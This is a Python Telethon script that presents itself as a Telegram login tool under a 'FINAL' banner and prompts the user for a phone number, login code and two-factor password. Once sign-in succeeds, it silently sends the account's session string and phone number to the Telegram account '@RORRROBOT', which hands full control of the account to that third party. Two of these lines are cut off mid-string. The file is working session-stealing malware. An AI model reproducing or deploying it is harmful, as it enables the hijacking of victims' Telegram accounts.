from telethon import TelegramClient, sync
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os
import pickle

api_id = 29914850
api_hash = "de7b0ee6f49fff7b4a5f0e5c015972ce"

os.system("clear")
print("""\033[031m

                    ███████╗██╗███╗   ██╗ █████╗ ██╗
                    ██╔════╝██║████╗  ██║██╔══██╗██║
                    █████╗  ██║██╔██╗ ██║███████║██║
                    ██╔══╝  ██║██║╚██╗██║██╔══██║██║
                    ██║     ██║██║ ╚████║██║  ██║███████╗
                    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝

Developer: @I0I0II

""")

try:
    with open('my_session.pkl', 'rb') as f:
        string = pickle.load(f)
    client = TelegramClient(StringSession(string), api_id, api_hash)

except FileNotFoundError:
    string = input("Press enter: ")
    client = TelegramClient(StringSession(string), api_id, api_hash)

finally: # الحمدلله دائما وابدا
    phone_number = input("\033[032mPlease enter your phone (or bot token): ")
    client.connect()

    if not client.is_user_authorized():
        client.send_code_request(phone_number)
        try:
            me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>

            with open('my_session.pkl', 'wb') as f:
                pickle.dump(client.session.save(), f)

        except SessionPasswordNeededError:
            password = input('\033[032mPlease enter your password: ')
            me2 = client.sign_in(password=password)
            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>

            with open('my_session.pkl', 'wb') as f:
                pickle.dump(client.session.save(), f)
